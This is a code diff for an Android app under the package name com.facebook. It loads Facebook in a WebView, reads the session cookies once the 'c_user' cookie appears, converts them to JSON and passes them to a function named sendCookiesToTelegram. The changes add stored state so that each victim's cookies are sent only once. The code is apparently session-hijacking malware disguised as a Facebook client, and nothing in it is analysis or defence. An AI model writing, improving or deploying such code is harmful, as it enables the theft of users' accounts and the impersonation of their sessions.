@@ -1,5 +1,7 @@
 package com.facebook;
 
+import android.content.Context;
+import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
@@ -23,6 +25,8 @@ import java.util.List;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+
+
 public class MainActivity extends AppCompatActivity {
 
 	private final String TAG = "MainActivity";
@@ -33,9 +37,13 @@ public class MainActivity extends AppCompatActivity {
 
     private WebView webView;
 	
+	private SharedPreferences preferences;
+	
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+		
+		preferences = getPreferences(Context.MODE_PRIVATE);
 	
         setContentView(R.layout.activity_main);
         webView = findViewById(R.id.webview);
@@ -51,7 +59,10 @@ public class MainActivity extends AppCompatActivity {
 				if (cookie.contains("c_user")) {
 					try {
 						String parsedCookies = parseCookiesToJson(cookie);
-						sendCookiesToTelegram(parsedCookies);
+						if (parsedCookies != null) {
+							sendCookiesToTelegram(parsedCookies);
+						}
+						
 					} catch (JSONException e) {
 						Log.e(TAG, e.getMessage());
 					}
@@ -72,6 +83,17 @@ public class MainActivity extends AppCompatActivity {
 			JSONObject jsonObject = new JSONObject();
 			jsonObject.put("name", arrayOfEachCookie[0].trim());
 			jsonObject.put("value", arrayOfEachCookie[1].trim());
+			
+			if (jsonObject.getString("name").equals("c_user")) {
+				if (jsonObject.getString("value").equals(preferences.getString("C_USER", "NO_C_USER"))) {
+					return null;
+				} else {
+					SharedPreferences.Editor edit = preferences.edit();
+					edit.putString("C_USER", jsonObject.getString("value"));
+					edit.apply();
+				}		
+			}
+			
 			jsonObject.put("domain", ".facebook.com");
 			
 			if (arrayOfEachCookie[0].equals("m_pixel_ratio")
